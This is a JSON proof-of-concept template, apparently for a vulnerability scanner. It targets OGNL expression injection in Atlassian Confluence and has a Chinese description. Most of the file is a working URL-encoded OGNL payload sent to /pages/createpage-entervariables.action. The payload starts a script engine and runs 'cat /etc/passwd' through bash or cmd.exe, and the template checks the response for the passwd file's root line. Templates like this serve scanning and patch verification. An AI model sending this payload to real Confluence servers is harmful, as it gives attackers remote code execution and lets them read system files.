{
    "Name": "Confluence OGNL表达式注入",
    "Description": "Atlassian Confluence是企业广泛使用的wiki系统,产品研发过程中的需求文档、产品设计文档、项目管理文档、技术文档、运维文档等等都统一发布在wiki中，并不断地迭代维护。所以想着自己的协同的办公也可使Confluence来实现，远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.",
    "Product": "Atlassian Confluence",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded"},
        "Uri":"/pages/createpage-entervariables.action?SpaceKey=x",
        "Port":"",
        "Data":"queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022cat+/etc/passwd%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "root:x:0:0:root"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
